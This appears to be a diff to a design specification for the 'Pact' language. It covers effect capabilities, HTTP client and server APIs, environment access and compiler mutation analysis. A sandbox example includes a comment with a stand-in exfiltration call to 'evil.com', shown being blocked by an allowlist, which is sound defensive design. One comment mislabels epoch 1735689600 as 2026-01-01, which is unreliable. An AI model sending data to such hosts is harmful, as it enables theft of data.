@@ -8,7 +8,7 @@ Every side effect a function can perform -- printing, reading a database, openin
 
 The consequences are structural:
 
-- A function with no `!` in its signature **cannot** perform side effects. The compiler proves it.
+- A function with no `!` in its signature **cannot** perform side effects. The compiler proves it. (It may still read or write module-level `let mut` bindings, which are tracked separately by mutation analysis — see §4.16.)
 - A function declaring `! DB.Read` can query a database but **cannot** write to it, delete from it, or administer it. The compiler proves it.
 - A package declaring `capabilities(Net.Connect)` in its manifest **cannot** open a listening socket. The compiler proves it.
 - An effect handler can attenuate capabilities -- handing a function a `Net.Connect` that only permits connections to a specific allowlist. The runtime enforces it.
@@ -148,6 +148,7 @@ effect Process {
     effect Spawn      // spawn child processes
     effect Signal     // send signals to processes
 }
+
 ```
 
 **Granting rules:**
@@ -177,7 +178,7 @@ fn example() ! IO.Print, FS.Read, DB.Read, Net.Connect, Crypto.Hash {
     io.print("Starting...")          // IO.Print handle
     let data = fs.read("input.txt")  // FS.Read handle
     let rows = db.read("SELECT *..") // DB.Read handle — string literal auto-parameterized to Query[DB]
-    let resp = net.connect(url)      // Net.Connect handle
+    let resp = net.get(url)?          // Net.Connect handle
     let hash = crypto.hash(data)     // Crypto.Hash handle
 }
 ```
@@ -189,9 +190,9 @@ fn example() ! IO.Print, FS.Read, DB.Read, Net.Connect, Crypto.Hash {
 | `IO` / `IO.*` | `io` | `io.print(...)`, `io.log(...)` |
 | `FS` / `FS.*` | `fs` | `fs.read(...)`, `fs.write(...)`, `fs.delete(...)`, `fs.watch(...)` |
 | `DB` / `DB.*` | `db` | `db.read(...)`, `db.write(...)`, `db.admin(...)` |
-| `Net` / `Net.*` | `net` | `net.connect(...)`, `net.listen(...)`, `net.dns(...)` |
-| `Env` / `Env.*` | `env` | `env.read(...)`, `env.write(...)` |
-| `Time` / `Time.*` | `time` | `time.read()`, `time.sleep(...)` |
+| `Net` / `Net.*` | `net` | `net.request(...)`, `net.get(...)`, `net.post(...)`, `net.listen(...)`, `net.dns(...)` |
+| `Env` / `Env.*` | `env` | `env.args()`, `env.var(...)`, `env.vars()`, `env.cwd()`, `env.set_var(...)`, `env.remove_var(...)`, `env.exit(...)` |
+| `Time` / `Time.*` | `time` | `time.read() -> Instant`, `time.sleep(Duration)` |
 | `Rand` | `rand` | `rand.int(...)`, `rand.float(...)`, `rand.bytes(...)` |
 | `Crypto` / `Crypto.*` | `crypto` | `crypto.hash(...)`, `crypto.sign(...)`, `crypto.encrypt(...)`, `crypto.decrypt(...)` |
 | `Process` / `Process.*` | `process` | `process.spawn(...)`, `process.signal(...)` |
@@ -224,6 +225,518 @@ error[InsufficientCapability]: insufficient effect capability
 When you read `fs.read(path)`, you know two things immediately: (1) this is a filesystem read, and (2) the enclosing function must declare `! FS.Read`. The handle is a visual anchor that traces directly back to the capability in the signature. An AI reading the function body can verify effect correctness locally -- no import resolution, no global namespace lookup.
 
 Handles also enable the handler mechanism (section 4.7). Because all effect operations route through a handle object, swapping the implementation behind the handle is straightforward. The handle is simultaneously a namespace, a capability proof, and a dispatch point.
+
+---
+
+#### 4.4.1 Net.Connect Operations
+
+The `Net.Connect` effect has one core operation and convenience default methods for HTTP verbs:
+
+```pact
+effect Net {
+    effect Connect {
+        fn request(req: Request) -> Result[Response, NetError]
+
+        // Default methods — desugar to request() calls
+        fn get(url: Str) -> Result[Response, NetError] {
+            net.request(Request.new("GET", url))
+        }
+        fn post(url: Str, body: Str) -> Result[Response, NetError] {
+            net.request(Request.new("POST", url).with_body(body))
+        }
+        fn put(url: Str, body: Str) -> Result[Response, NetError] {
+            net.request(Request.new("PUT", url).with_body(body))
+        }
+        fn delete(url: Str) -> Result[Response, NetError] {
+            net.request(Request.new("DELETE", url))
+        }
+        fn head(url: Str) -> Result[Response, NetError] {
+            net.request(Request.new("HEAD", url))
+        }
+        fn patch(url: Str, body: Str) -> Result[Response, NetError] {
+            net.request(Request.new("PATCH", url).with_body(body))
+        }
+    }
+
+    effect Listen   // server-side binding (§4.4.2)
+    effect DNS      // DNS resolution (§4.4.3, future)
+}
+```
+
+**Handler implementors implement `request()` only.** The verb methods are default implementations that construct a `Request` and delegate. A handler overriding `get` directly (e.g., for caching GET responses) can do so — partial handlers auto-delegate unimplemented operations.
+
+```pact
+// Minimal mock — one method covers all HTTP verbs
+fn mock_net(responses: Map[Str, Str]) -> Handler[Net.Connect] {
+    handler Net.Connect {
+        fn request(req: Request) -> Result[Response, NetError] {
+            match responses.get(req.url) {
+                Some(body) => Ok(Response { status: 200, body: body, headers: Map.new() })
+                None => Err(NetError.ConnectionRefused("mock: no response for {req.url}"))
+            }
+        }
+    }
+}
+```
+
+**The `Request` type** is a struct with builder methods for progressive configuration:
+
+```pact
+type Request {
+    method: Str
+    url: Str
+    body: Str = ""
+    headers: Map[Str, Str] = Map.new()
+    timeout_ms: Int = 30000
+}
+```
+
+`Request.new()` is compiler-provided (same pattern as `List.new()`, `Map.new()`). Builder methods are provided via the `RequestOps` trait:
+
+```pact
+trait RequestOps {
+    fn with_body(self, body: Str) -> Request
+    fn with_header(self, name: Str, value: Str) -> Request
+    fn with_timeout(self, ms: Int) -> Request
+}
+```
+
+Simple cases stay simple. Complex cases use the builder:
+
+```pact
+// Simple GET
+let resp = net.get("https://api.example.com/users")?
+
+// GET with headers
+let req = Request.new("GET", url)
+    .with_header("Authorization", "Bearer {token}")
+    .with_timeout(5000)
+let resp = net.request(req)?
+
+// POST with JSON body
+let resp = net.post("https://api.example.com/users", json.stringify(user))?
+```
+
+**The `Response` type** is a transparent struct — fields are directly accessible and pattern-matchable:
+
+```pact
+type Response {
+    status: Int
+    body: Str
+    headers: Map[Str, Str]
+}
+```
+
+Convenience methods are provided via the `ResponseOps` trait:
+
+```pact
+trait ResponseOps {
+    fn json(self) -> Result[JsonValue, JsonError]
+    fn header(self, name: Str) -> Option[Str]
+    fn is_ok(self) -> Bool
+}
+```
+
+Pattern matching on responses is natural:
+
+```pact
+match net.get(url)? {
+    Response { status: 200, body } => process(body)
+    Response { status: 404, .. } => Err(AppError.NotFound("resource gone"))
+    Response { status, .. } => Err(AppError.Http("unexpected status {status}"))
+}
+```
+
+**The `NetError` type** covers transport-level failures:
+
+```pact
+type NetError {
+    Timeout(msg: Str)
+    ConnectionRefused(msg: Str)
+    DnsFailure(msg: Str)
+    TlsError(msg: Str)
+    InvalidUrl(msg: Str)
+}
+```
+
+HTTP error status codes (4xx, 5xx) are **not** `NetError` variants — they are successful responses with non-2xx status codes. The application decides what constitutes an error via pattern matching on `response.status`.
+
+**WebSocket and SSE:** Deferred to v2. `Net.Connect` covers HTTP request/response only in v1. WebSocket requires persistent bidirectional channels with different algebraic semantics.
+
+---
+
+#### 4.4.2 Net.Listen Operations
+
+**Status: v1. Resolved by panel vote: 3-2 minimal value-server, 4-1 functional middleware, 3-2 typed error handler, 4-1 validation effect.**
+
+The `Net.Listen` effect provides HTTP server capabilities. Like `Net.Connect`, it has one core operation (`serve`) with convenience methods for route registration:
+
+```pact
+effect Net {
+    effect Listen {
+        fn serve(server: Server) -> Result[(), ServerError]
+
+        // Route registration — builds the Server value
+        fn listen(host: Str, port: Int) -> Server
+    }
+}
+```
+
+**The `Server` type** is a value built up by route registration, then started:
+
+```pact
+type Server {
+    host: Str
+    port: Int
+    routes: List[Route]
+    middleware: List[fn(fn(Request) -> Response) -> fn(Request) -> Response]
+    error_handler: fn(Request, ServerError) -> Response = default_error_handler
+}
+```
+
+Route registration and server startup follow the familiar Flask/Express/Go pattern:
+
+```pact
+fn start_server(config: ServerConfig) ! Net.Listen, IO {
+    let server = net.listen(config.host, config.port)
+    server.route("GET", "/users/:id", handle_get_user)
+    server.route("POST", "/users", handle_create_user)
+    server.serve()
+}
+```
+
+**Convenience verb methods** mirror `Net.Connect`'s pattern — sugar over `.route()`:
+
+```pact
+// These are equivalent:
+server.route("GET", "/users/:id", handle_get_user)
+server.get("/users/:id", handle_get_user)
+
+server.route("POST", "/users", handle_create_user)
+server.post("/users", handle_create_user)
+```
+
+**Handler function signature:** Every route handler receives a `Request` and returns a `Response`, declaring whatever effects it needs:
+
+```pact
+pub fn handle_get_user(req: Request) -> Response ! IO, DB.Read {
+    let id = req.param("id").parse_int() ?? return Response.bad_request("Invalid ID")
+    match get_user(id) {
+        Ok(user) => Response.json(user)
+        Err(ApiError.NotFound(msg)) => Response.not_found(msg)
+        Err(e) => Response.internal_error("{e}")
+    }
+}
+```
+
+**The `Route` type** is internal to `Server`:
+
+```pact
+type Route {
+    method: Str
+    pattern: Str
+    handler: fn(Request) -> Response
+    error_handler: Option[fn(Request, ServerError) -> Response] = None
+}
+```
+
+##### Middleware
+
+Middleware uses functional wrapping: `fn(handler) -> handler`. A middleware function takes a handler and returns a new handler that wraps it:
+
+```pact
+fn with_logging(handler: fn(Request) -> Response) -> fn(Request) -> Response ! IO.Log {
+    fn(req: Request) -> Response {
+        io.log("Request: {req.method} {req.path}")
+        let resp = handler(req)
+        io.log("Response: {resp.status}")
+        resp
+    }
+}
+
+fn with_auth(handler: fn(Request) -> Response) -> fn(Request) -> Response {
+    fn(req: Request) -> Response {
+        match req.header("Authorization") {
+            Some(token) => {
+                // validate token...
+                handler(req)
+            }
+            None => Response.unauthorized("Missing Authorization header")
+        }
+    }
+}
+```
+
+Compose by nesting — outermost wrapper runs first:
+
+```pact
+// Logging wraps auth wraps handler: log → auth check → handler → log response
+server.route("GET", "/users/:id", with_logging(with_auth(handle_get_user)))
+```
+
+Global middleware applies to all routes:
+
+```pact
+server.use(with_logging)    // applies to all subsequently registered routes
+server.use(with_auth)
+server.get("/users/:id", handle_get_user)
+server.post("/users", handle_create_user)
+```
+
+**Why functional wrapping over effect handler stacking (4-1 vote):** `fn(handler) -> handler` compiles to direct function pointer composition in C — the wrapping chain collapses at server startup, not per-request. Effect handler stacking would require per-request vtable traversal through nested `with` blocks. Functional composition is also the most universal middleware pattern across web frameworks (Express, Rack, WSGI, Go), giving LLMs strong training signal for correct code generation.
+
+##### Error Recovery
+
+The `ServerError` sum type covers server-level failures:
+
+```pact
+type ServerError {
+    HandlerPanic(msg: Str)
+    Timeout(msg: Str)
+    Internal(msg: Str)
+}
+```
+
+Error handling is configurable via the `error_handler` field on `Server`:
+
+```pact
+fn json_error_handler(req: Request, err: ServerError) -> Response {
+    match err {
+        ServerError.HandlerPanic(msg) => Response.internal_error(json.stringify({
+            error: "internal_error",
+            message: msg
+        }))
+        ServerError.Timeout(msg) => Response { status: 504, body: json.stringify({
+            error: "timeout",
+            message: msg
+        }), headers: Map.new() }
+        ServerError.Internal(msg) => Response.internal_error(json.stringify({
+            error: "internal_error",
+            message: msg
+        }))
+    }
+}
+
+let server = net.listen(config.host, config.port)
+server.error_handler = json_error_handler
+```
+
+Per-route overrides are supported:
+
+```pact
+// API routes return JSON errors
+server.get("/api/users/:id", handle_get_user).on_error(json_error_handler)
+
+// Page routes return HTML errors
+server.get("/pages/:slug", handle_page).on_error(html_error_handler)
+```
+
+The default error handler returns a plain-text 500 response. Handler panics are caught by the server runtime (no `setjmp`/`longjmp` — the server event loop wraps each handler invocation in a safe call boundary).
+
+##### @requires Validation at System Boundaries
+
+When a route handler calls a function with `@requires` contracts, the compiler generates `validation.contract_violation()` effect operations instead of panics. The default handler returns a structured 400 JSON response. Users can swap the handler for custom behavior (422, localized messages, JSON:API format).
+
+```pact
+@requires(id > 0)
+pub fn get_user(id: Int) -> Result[User, ApiError] ! DB.Read {
+    // ...
+}
+
+// The compiler sees get_user(id) called from a route handler.
+// It generates: validation.contract_violation("id", "id > 0", id)
+// when the contract would fail.
+// Default handler returns:
+// Response { status: 400, body: '{"error":"validation_failed","violations":[{"param":"id","constraint":"id > 0","value":-1}]}' }
+```
+
+Custom validation handler via effect system:
+
+```pact
+fn custom_validation_handler() -> Handler[Validation] {
+    handler Validation {
+        fn contract_violation(param: Str, constraint: Str, value: Str) -> Response {
+            Response { status: 422, body: json.stringify({
+                errors: [{ field: param, rule: constraint, received: value }]
+            }), headers: Map.new() }
+        }
+    }
+}
+
+// Apply to server
+fn start_server(config: ServerConfig) ! Net.Listen, IO {
+    let server = net.listen(config.host, config.port)
+    server.get("/users/:id", handle_get_user)
+    with custom_validation_handler() {
+        server.serve()
+    }
+}
+```
+
+The validation effect works outside HTTP contexts too — CLI argument validation, batch processing, message consumers. See §9.2 for full system boundary detection rules.
+
+**Mock validation in tests:**
+
+```pact
+test "validation collects violations" {
+    let violations = List.new()
+    let mock_validation = handler Validation {
+        fn contract_violation(param: Str, constraint: Str, value: Str) -> Response {
+            violations.push({ param: param, constraint: constraint, value: value })
+            Response.bad_request("test")
+        }
+    }
+    with mock_validation, mock_db_with_users([]) {
+        let resp = handle_get_user(Request.new("GET", "/users/-1"))
+        assert_eq(violations.len(), 1)
+        assert_eq(violations[0].param, "id")
+    }
+}
+```
+
+##### Server Handler Implementation
+
+Handler implementors implement `serve()` — the core operation. Route registration methods build the `Server` value; the handler receives the fully-configured server:
+
+```pact
+fn mock_server() -> Handler[Net.Listen] {
+    handler Net.Listen {
+        fn listen(host: Str, port: Int) -> Server {
+            Server { host: host, port: port, routes: [], middleware: [],
+                     error_handler: default_error_handler }
+        }
+        fn serve(server: Server) -> Result[(), ServerError] {
+            // Test implementation: verify routes are registered
+            assert(server.routes.len() > 0)
+            Ok(())
+        }
+    }
+}
+
+test "server starts with routes" {
+    with mock_server() {
+        let server = net.listen("localhost", 8080)
+        server.get("/health", fn(req: Request) -> Response { Response.ok("ok") })
+        net.serve(server)
+    }
+}
+```
+
+**Static file serving:** Not a language-level concern. Implement as a handler function:
+
+```pact
+fn static_files(root: Str) -> fn(Request) -> Response ! FS.Read {
+    fn(req: Request) -> Response {
+        let path = "{root}/{req.path}"
+        match fs.read(path) {
+            Ok(content) => Response.ok(content)
+            Err(_) => Response.not_found("File not found")
+        }
+    }
+}
+
+server.get("/static/*", static_files("./public"))
+```
+
+---
+
+#### 4.4.3 Env Operations
+
+The `Env` effect provides access to the process environment: command-line arguments, environment variables, working directory, and process exit. Operations are split between `Env.Read` (observation) and `Env.Write` (mutation), with `exit` requiring full `Env` authority.
+
+```pact
+effect Env {
+    effect Read {
+        /// Command-line arguments (argv). Always returns at least one element (program name).
+        fn args() -> List[Str]
+
+        /// Read a single environment variable. Returns None if the variable is not set.
+        /// Non-UTF-8 values are lossy-converted to UTF-8 or returned as None.
+        fn var(name: Str) -> Option[Str]
+
+        /// Snapshot of all environment variables at time of call.
+        fn vars() -> Map[Str, Str]
+
+        /// Current working directory.
+        fn cwd() -> Str
+    }
+
+    effect Write {
+        /// Set an environment variable. Creates it if it does not exist.
+        fn set_var(name: Str, value: Str)
+
+        /// Remove an environment variable. No-op if the variable does not exist.
+        fn remove_var(name: Str)
+    }
+
+    /// Terminate the process with an exit code. Requires full Env, not just Read or Write.
+    /// This is a non-resumable operation — handlers intercept but cannot resume past exit.
+    fn exit(code: Int) -> Never
+}
+```
+
+**Capability boundaries:**
+
+| Declaration | Available operations |
+|---|---|
+| `! Env.Read` | `env.args()`, `env.var(...)`, `env.vars()`, `env.cwd()` |
+| `! Env.Write` | `env.set_var(...)`, `env.remove_var(...)` |
+| `! Env` | All of the above plus `env.exit(...)` |
+
+`env.exit()` requires `! Env` (the parent) because it is neither pure observation nor environment mutation — it is process termination. A function declaring only `! Env.Read` or `! Env.Write` cannot call `env.exit()`:
+
+```pact
+fn load_config() -> Config ! Env.Read {
+    let db = env.var("DATABASE_URL") ?? panic("DATABASE_URL not set")
+    let port = env.var("PORT") ?? "8080"
+    Config { db_url: db, port: port.parse_int() ?? 8080 }
+}
+
+fn run_cli() ! Env, IO {
+    let args = env.args()
+    if args.len() < 2 {
+        io.println("Usage: mytool <command>")
+        env.exit(1)  // requires ! Env, not just Env.Read
+    }
+    let verbose = env.var("VERBOSE").is_some()
+    let cwd = env.cwd()
+    io.println("Running from {cwd}")
+}
+```
+
+**Why `env.exit()` is an effect operation, not standalone:**
+
+`panic()` is untracked divergence — it represents a program error (invariant violation). `exit()` is intentional control flow with an observable result (the exit code). Making it an effect operation means:
+
+1. Handlers can intercept it for testing — a mock `Env` handler captures exit codes instead of terminating the test runner
+2. The capability system tracks which code can terminate the process
+3. Sandboxed code cannot exit unless granted `! Env`
+
+```pact
+test "CLI exits with 1 on missing args" {
+    let mut exit_code = -1
+    let mock = handler Env {
+        fn args() -> List[Str] { ["mytool"] }
+        fn var(name: Str) -> Option[Str] { None }
+        fn vars() -> Map[Str, Str] { Map.new() }
+        fn cwd() -> Str { "/tmp" }
+        fn set_var(name: Str, value: Str) { }
+        fn remove_var(name: Str) { }
+        fn exit(code: Int) -> Never {
+            exit_code = code
+            abort
+        }
+    }
+    with mock, capture_io([]) {
+        run_cli()
+    }
+    assert_eq(exit_code, 1)
+}
+```
+
+**`env.vars()` returns a snapshot:** The returned `Map[Str, Str]` is a copy of the environment at the time of the call. Subsequent `env.set_var()` or `env.remove_var()` calls do not affect previously returned maps. This ensures deterministic behavior in concurrent code.
+
+**Thread safety:** `env.set_var()` and `env.remove_var()` are process-global mutations. The runtime serializes these calls (mutex-protected `setenv`/`unsetenv`). In concurrent programs using `! Async`, only one task can modify the environment at a time. Use sparingly — prefer configuration structs over environment mutation.
 
 ---
 
@@ -409,7 +922,7 @@ fn run_plugin(plugin: Plugin) ! Net.Connect, FS.Read, IO.Log {
 }
 ```
 
-Inside the `with` block, `net.connect(url)` checks the URL against the allowlist and returns an error for disallowed hosts. `fs.read(path)` is scoped to `/plugins/data/` -- attempts to read outside that directory fail. The plugin code declares `! Net.Connect, FS.Read` and has no idea it is sandboxed.
+Inside the `with` block, `net.get(url)` checks the URL against the allowlist and returns an error for disallowed hosts. `fs.read(path)` is scoped to `/plugins/data/` -- attempts to read outside that directory fail. The plugin code declares `! Net.Connect, FS.Read` and has no idea it is sandboxed.
 
 #### Defining a handler
 
@@ -823,11 +1336,12 @@ Capabilities can be narrowed but never widened. A handler that receives `Net.Con
 ```pact
 fn restricted_net(allowed_hosts: List[Str]) -> Handler[Net.Connect] {
     handler Net.Connect {
-        fn connect(url: Url) -> Result[Response, NetError] {
-            if allowed_hosts.contains(url.host) {
-                default.connect(url)  // delegate to the outer handler
+        fn request(req: Request) -> Result[Response, NetError] {
+            let host = parse_host(req.url)
+            if allowed_hosts.contains(host) {
+                default.request(req)  // delegate to the outer handler
             } else {
-                Err(NetError.Forbidden("host {url.host} not in allowlist"))
+                Err(NetError.ConnectionRefused("host {host} not in allowlist"))
             }
         }
     }
@@ -835,8 +1349,8 @@ fn restricted_net(allowed_hosts: List[Str]) -> Handler[Net.Connect] {
 
 fn run_third_party_code() ! Net.Connect, IO.Log {
     with restricted_net(["api.trusted.com"]) {
-        // Inside this block, net.connect("https://api.trusted.com/data") works
-        // But net.connect("https://evil.com/exfiltrate") returns Err
+        // Inside this block, net.get("https://api.trusted.com/data") works
+        // But net.get("https://evil.com/exfiltrate") returns Err
         third_party_library.fetch_data()
     }
 }
@@ -848,7 +1362,7 @@ Attenuation follows the principle of least privilege. When calling untrusted or 
 fn sandbox_plugin(plugin: Plugin) ! FS.Read, Net.Connect, IO.Log, Time.Read {
     let fs_scope = scoped_fs("/var/plugins/{plugin.id}/data/")
     let net_allow = restricted_net(plugin.manifest.allowed_hosts)
-    let time_frozen = frozen_time(Time.of(2026, 1, 1))  // deterministic time for reproducibility
+    let time_frozen = frozen_time(Instant.from_epoch_secs(1735689600))  // 2026-01-01, deterministic
 
     with fs_scope, net_allow, time_frozen {
         plugin.run()
@@ -856,7 +1370,7 @@ fn sandbox_plugin(plugin: Plugin) ! FS.Read, Net.Connect, IO.Log, Time.Read {
 }
 ```
 
-The plugin receives handles that look identical to unrestricted ones. It calls `fs.read(...)`, `net.connect(...)`, `time.read()` through the same interface. It has no mechanism to detect or bypass the attenuation. This is the ocap principle: capabilities are unforgeable and can only be attenuated, never amplified.
+The plugin receives handles that look identical to unrestricted ones. It calls `fs.read(...)`, `net.get(...)`, `time.read()` through the same interface. It has no mechanism to detect or bypass the attenuation. This is the ocap principle: capabilities are unforgeable and can only be attenuated, never amplified.
 
 **Attenuation is compositional:**
 
@@ -884,6 +1398,7 @@ The effect system replaces several ad-hoc features that exist as separate mechan
 | Dependency injection | Effect handlers | `with postgres_handler(config) { ... }` replaces constructor injection, service locators, DI containers. |
 | Mocking / test doubles | Test handlers | `with mock_db(fixtures) { ... }` replaces mockito, unittest.mock, testdouble. |
 | IO monads (Haskell) | `! IO.*` effects | Same purity tracking without monadic syntax (`>>=`, `do` notation). Effects compose with `,`, not monad transformers. |
+| Global mutable state | Mutation analysis (§4.16) | Module-level `let mut` mutation tracked by compiler write-set inference. Cross-module statefulness via user-defined effects (§4.12). |
 | `synchronized` / locks | `! Sync` effect (future) | Shared mutable state as an explicit effect, not an invisible side channel. |
 | Sandbox / permissions | Capability attenuation | `with restricted_net(allowlist) { ... }` replaces OS-level sandboxing, seccomp, AppArmor for application-level policy. |
 | Feature flags | Handler selection | `with feature_handler(flags) { ... }` routes effect operations based on runtime configuration. |
@@ -1373,3 +1888,164 @@ fn zip_with[A, B, C, e1, e2](f: fn(A) -> B ! e1, g: fn(B) -> C ! e2) -> Iterator
 Named variables enable: distinguishing effect sets from different callbacks, constraining effects (e.g., "callback may do IO but not DB"), and composing effect sets algebraically. The `_` wildcard is forward-compatible — it can desugar to an anonymous effect variable when named variables are added.
 
 **Effectful iteration:** The 3-2 vote deferring effectful iteration to v2 remains in effect. However, with `! _` on Iterator adapter signatures, effectful callbacks in `map`, `filter`, `fold`, and `for_each` become expressible once the Iterator trait is updated to carry wildcards. This update is a v2 change gated on real-world feedback.
+
+---
+
+### 4.16 Module-Level Mutation Analysis
+
+Module-level `let mut` bindings are a real and necessary feature — the Pact compiler itself uses them extensively (parser position, token buffers, pending comments). But untracked mutation of these bindings caused three real bugs where speculative lookahead saved and restored `pos` but not `pending_comments`, because nothing indicated which state each function touched.
+
+Pact addresses this with a **two-tier model**: automatic compiler analysis (intra-module) and opt-in user-defined effects (cross-module).
+
+#### 4.16.1 Tier 1: Compiler Write-Set Inference
+
+The compiler performs **mutation analysis** on every function in a module. For each function, it computes the **write set**: which module-level `let mut` bindings the function (or its callees within the module) writes to.
+
+**Key properties:**
+
+- **Fully inferred** — no annotations in signatures. Functions look clean.
+- **Writes only** — reading a `let mut` binding is free, not tracked as mutation.
+- **Includes method calls** — `list.push(x)` on a module-level `let mut` binding counts as a write.
+- **Transitive within module** — if `fn a()` calls `fn b()` which writes `pos`, then `a`'s write set includes `pos`.
+- **Zero runtime cost** — purely compile-time analysis. Generated C is identical.
+- **Not an effect** — this is a compiler analysis like type inference, not a declared effect. No `!` annotations needed.
+
+Example of what the compiler tracks internally:
+
+```
+advance()               → writes {pos}
+skip_newlines()         → writes {pos, pending_comments}
+at()                    → writes {}  (reads pos, but reads are free)
+looks_like_struct_lit() → writes {pos, pending_comments}
+```
+
+The analysis enables rich diagnostics. The compiler can now detect when a save/restore pattern misses a binding:
+
+```
+warning[IncompleteStateRestore]: speculative lookahead may leave stale state
+ --> parser.pact:42:5
+  |
+42 |     let saved = pos
+  |         ^^^^^ saves `pos` before calling `skip_newlines`
+  |
+  = note: `skip_newlines` writes {pos, pending_comments}
+  = note: only `pos` is restored after the call
+  = help: also save and restore `pending_comments`, or use a
+          non-mutating alternative
+```
+
+The LSP shows inferred write sets on hover — developers and AI can see which globals a function touches without reading its body.
+
+#### 4.16.2 What Counts as a Write
+
+| Access | Tracked as write? | Rationale |
+|--------|-------------------|-----------|
+| Assign to module-level `let mut` (`pos = pos + 1`) | **Yes** | Direct mutation |
+| Mutating method call on module-level `let mut` (`tokens.push(t)`) | **Yes** | Mutation through method |
+| Read module-level `let mut` (`return pos`) | No | Reads are free — no state corruption risk |
+| Read module-level `let` (immutable) | No | Immutable — equivalent to a constant |
+| Read/write function-local `let mut` | No | Contained within function scope |
+| Mutate collection received as parameter | No | Tracked through type system, not mutation analysis. Deferred to v2 |
+| Mutate captured `let mut` in closure | No | Lexically scoped — visible within enclosing function body |
+
+#### 4.16.3 Purity and Non-Mutating Functions
+
+A function with no `!` and an empty write set is **non-mutating** — it does not write to any module-level `let mut` bindings. This is weaker than full referential transparency because the function may still *read* mutable state and thus return different values on different calls.
+
+Truly pure functions — those that neither read nor write module-level mutable state, with output depending only on inputs — can be identified by the compiler for optimization (memoization, reordering). This is an internal optimization analysis, not a user-facing annotation.
+
+```pact
+let mut pos = 0
+
+// Non-mutating, but NOT pure — reads `pos`, return value depends on call order
+fn current_pos() -> Int {
+    pos
+}
+
+// Pure — output depends only on inputs, no module state access
+fn add(a: Int, b: Int) -> Int {
+    a + b
+}
+
+// Mutating — writes {pos}
+fn advance() {
+    pos = pos + 1
+}
+```
+
+Note that `advance()` has **no `!` annotation**. Module-level mutation is tracked by the compiler's write-set analysis, not by the effect system. The function signature stays clean.
+
+#### 4.16.4 Transitive Tracking
+
+Write sets are computed transitively within a module. If `fn a()` calls `fn b()` which calls `fn c()` which writes `pos`, then all three have `pos` in their write sets.
+
+```pact
+let mut pos = 0
+let mut pending_comments: List[Comment] = List.new()
+
+fn advance() {                           // writes {pos}
+    pos = pos + 1
+}
+
+fn skip_newlines() {                     // writes {pos, pending_comments}
+    while at() == CH_NEWLINE {
+        advance()
+        if at() == CH_HASH {
+            pending_comments.push(parse_comment())
+        }
+    }
+}
+
+fn looks_like_struct_lit() -> Bool {     // writes {pos, pending_comments}
+    let saved_pos = pos
+    let saved_comments = pending_comments.clone()
+    skip_newlines()
+    let result = at() == CH_LBRACE
+    pos = saved_pos
+    pending_comments = saved_comments
+    result
+}
+```
+
+The compiler knows `looks_like_struct_lit` writes `{pos, pending_comments}` transitively through `skip_newlines`. It can verify that both are saved and restored.
+
+Cross-module calls are **not** transitively tracked. A call to an imported function is opaque — the compiler does not look inside it. This keeps compilation modular and avoids coupling internal implementation details across module boundaries.
+
+#### 4.16.5 Tier 2: User-Defined Effects for Cross-Module State
+
+If a module author wants callers to know about statefulness, they use **user-defined effects** (§4.12):
+
+```pact
+effect Parse {
+    effect Advance
+    effect Reset
+}
+
+pub fn next_token() -> Token ! Parse.Advance {
+    pos = pos + 1
+    // ...
+}
+
+pub fn reset(saved: ParserState) ! Parse.Reset {
+    pos = saved.pos
+    pending_comments = saved.comments
+}
+```
+
+Callers see `! Parse.Advance` in the signature and know the call changes parser state. This is opt-in — most modules with private mutable state don't need it because the state is encapsulated behind the public API. User-defined effects follow all the same rules as built-in effects: hierarchical, handle-based, handler-swappable, testable.
+
+#### 4.16.6 Interaction with Existing Features
+
+**Not an effect.** Mutation analysis is orthogonal to the effect system. A function can have an empty write set and still declare `! IO.Log`. A function can write to module globals and still have no `!` in its signature. The two systems track different things: effects track capability usage (IO, DB, Net), mutation analysis tracks internal state changes.
+
+**Module capability budgets (§4.8, §4.9):** Mutation analysis does not participate in capability budgets. Module-level mutable state is internal to a module and does not cross trust boundaries. A package declaring `capabilities = []` (pure computation) can still use module-level `let mut` bindings — the state is encapsulated.
+
+**`main` (§4.6):** `main` is not special for mutation analysis. It has a write set like any other function, computed transitively from what it calls.
+
+**Closures:** If a closure writes to a module-level `let mut` binding, the write is attributed to the enclosing function's write set. Closures that only capture function-local `let mut` are not tracked.
+
+#### 4.16.7 Compilation
+
+Mutation analysis is a **purely compile-time pass**. It generates no runtime code. The generated C for a function is identical whether or not mutation analysis is enabled — module-level `let mut` compiles to a C global variable regardless. The analysis exists solely to enable diagnostics and tooling.
+
+The analysis runs after parsing and type checking, as a separate compiler pass. It builds a call graph within each module and propagates write sets bottom-up. The time complexity is linear in the number of functions × call edges within a module.
